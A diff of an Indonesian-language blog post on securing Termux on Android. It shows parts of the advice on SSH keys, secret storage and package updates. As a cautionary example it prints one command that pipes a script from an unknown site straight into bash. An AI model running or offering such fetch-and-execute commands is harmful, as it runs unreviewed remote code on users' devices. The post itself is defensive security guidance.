@@ -1,6 +1,3 @@
-
-
-```markdown
 ---
 title: "Mengamankan Termux: Panduan Dasar untuk Pengguna Android"
 description: "Termux adalah alat yang sangat kuat di Android. Pelajari langkah-langkah dasar mengamankan lingkungan Termux Anda dari akses tidak sah dan potensi risiko keamanan."
@@ -42,9 +39,7 @@ Sebaiknya, gunakan autentikasi berbasis kunci (SSH Key). Anda juga harus selalu 
 ## 3. Waspadai Skrip "Curl | Bash"
 
 Sering kali kita mencari solusi di internet dan disuguhi perintah seperti ini:
-```bash
 curl -sL https://situs-tidak-dikenal.com/script.sh | bash
-```
 
 Perintah ini mengunduh skrip dan langsung menjalankannya tanpa Anda bisa membacanya. Ini adalah vektor serangan yang sangat berbahaya. Selalu unduh skripnya (curl -O), baca isinya, pahami apa yang dilakukannya, baru jalankan. Prinsip ini sejalan dengan panduan kami tentang Menyusun Skrip Shell yang Lebih Aman.
 
@@ -58,9 +53,7 @@ Jangan pernah menyimpan token API, password, atau kunci SSH pribadi di folder ya
 
 Termux menggunakan manajer paket pkg atau apt. Pembaruan sering kali berisi tambalan keamanan (security patches) untuk celah yang baru ditemukan. Rajin-rajinlah menjalankan:
 
-```bash
 pkg update && pkg upgrade
-```
 
 Kesimpulan
 
@@ -72,4 +65,3 @@ Sumber
 · Termux Wiki: Remote Access
 · Android Developer: Application Sandbox
 
-```
